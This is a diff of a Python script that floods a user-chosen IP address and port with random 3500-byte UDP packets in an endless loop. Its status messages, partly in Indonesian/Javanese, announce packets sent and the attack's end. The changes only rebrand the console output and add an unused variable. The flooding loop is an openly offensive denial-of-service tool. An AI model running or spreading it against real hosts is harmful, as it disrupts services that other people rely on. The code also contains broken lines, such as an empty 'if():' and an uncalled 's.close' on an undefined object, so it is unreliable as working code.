@@ -29,7 +29,7 @@ class bcolors:
 white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(3500)
 ####################
-
+attemps = 0
 os.system("clear")
 print("""
 
@@ -62,7 +62,9 @@ while True:
         white.sendto(bytes, (ip, port))
         sent = sent + 1
         time.sleep(1)
-        print("\033[94m[IDRIB] \033[97m%s  \033[31m[Ngirim ke]  \033[92m%s  \033[36mPort \033[33m%s " % (sent, ip, port))
+        print("\033[100m \033[7m[IMF0] \033[0m \033[97m%s  \033[31mSent \033[92m%s \033[36mPort \033[33m%s " % (sent, ip, port))
+        print("\033[97m[IMF0] \033[0m \033[36m%s  \033[32mSent \033[92m%s \033[94mPort \033[33m%s " % (sent, ip, port))
+    
     if():
         s.close
         print("\033[92mSerangan wes Rampung\033[0m")
